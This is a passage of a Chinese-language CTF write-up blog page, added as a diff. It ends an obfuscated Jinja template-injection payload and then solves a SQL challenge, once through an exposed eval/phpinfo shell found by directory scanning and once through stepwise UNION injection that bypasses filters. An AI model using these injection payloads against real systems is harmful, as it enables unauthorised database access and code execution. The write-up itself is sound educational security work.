class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))))[</span><span class="s1">&#39;r&#39;&#39;ead&#39;</span><span class="p">]()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>总结，fenjing还是很强，以前不会用，以后注意一定要带上参数</p>
+<h1 id="light_pink-sql">light_pink-sql
+</h1><p>这题是考sql，但是有非预期</p>
+<h2 id="非预期">非预期
+</h2><p>拿dirsearch扫一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python dirsearch.py -u http://node6.anna.nssctf.cn:23588/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325105744862.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325105744862"
+	
+	
+></p>
+<p>db.php没有东西，但是shell.php有好东西</p>
+<p><img src="/images/image-20250325105829564.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325105829564"
+	
+	
+></p>
+<p>直接有eval了，我这可以直接打一句话木马了！</p>
+<p><strong>但是</strong>！这里有phpinfo!,所以我猜测一下可能会有flag，直接搜flag或者nss，发现flag在环境变量</p>
+<p><img src="/images/image-20250325110256336.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="预期解">预期解
+</h2><p>预期解显然就是打sql</p>
+<p>先打<code>1'#%23</code>(%23就是#，&ndash;+被过滤了)</p>
+<p>然后试<code>1' order by 5%23</code>(试到6报错)</p>
+<p><img src="/images/image-20250325110841608.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325110841608"
+	
+	
+></p>
+<p>然后看看哪有回显，但是报错，原因是-被禁用</p>
+<p><img src="/images/image-20250325111811920.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325111811920"
+	
+	
+></p>
+<p>果然-被禁，结果是4是回显</p>
+<p><img src="/images/image-20250325111857831.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325111857831"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0&#39; union select 1,2,3,4,5%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>接下来找表</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0&#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325112652290.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>显示不可以哦=，所以应该是**=被过滤，用like代替**</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0&#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325112517182.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325112517182"
+	
+	
+></p>
+<p><strong>查列</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0&#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like &#39;Cute&#39;%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325113651410.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong>查flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0&#39; union select 1,2,3,group_concat(Happy),5 from Cute%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325113842924.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325113842924"
+	
+	
+></p>
+<p>此题过滤了-还有=,但是还是比较友好，毕竟报错还是有提示，是一个不错的sql题</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-长城杯-ccforum</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025-nctf-web/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025-nctf-web/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E6%B0%9B%E5%9B%B4%E6%84%9F-%E7%BE%8E%E5%A5%B3.0607be2685ca7c36c0a8c7f574edbb9b_hu_6af95db09c493a10.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025-nctf-web"
+                        
+                        data-hash="md5-Bge&#43;JoXKfDbAqMf1dO27mw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-nctf-web</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        
+            我爱tingting <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
